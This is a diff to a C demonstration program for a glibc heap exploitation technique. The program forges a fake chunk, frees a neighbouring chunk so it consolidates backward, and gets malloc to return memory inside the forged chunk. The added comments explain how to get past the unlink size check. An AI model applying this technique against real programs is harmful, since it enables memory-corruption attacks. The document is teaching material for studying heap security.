@@ -88,10 +88,17 @@ int main()
     printf("Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set\n");
     free(b);
     printf("Our fake chunk size is now %#lx (b.size + fake_prev_size)\n", fake_chunk[1]);
-//    printf("We edit our fake chunk size so that it is small enough to pass size checks\n");
 
-  //  fake_chunk[1] = 0x1000;
-    //printf("New fake_chunk size: %#lx\n", fake_chunk[1]);
+    //if we allocate another chunk before we free b we will need to 
+    //do two things: 
+    //1) We will need to adjust the size of our fake chunk so that
+    //fake_chunk + fake_chunk's size points to an area we control
+    //2) we will need to write the size of our fake chunk
+    //at the location we control. 
+    //After doing these two things, when unlink gets called, our fake chunk will
+    //pass the size(P) == prev_size(next_chunk(P)) test. 
+    //otherwise we need to make sure that our fake chunk is up against the
+    //wilderness
 
     printf("\nNow we can call malloc() and it will begin in our fake chunk\n");
     d = malloc(0x200);
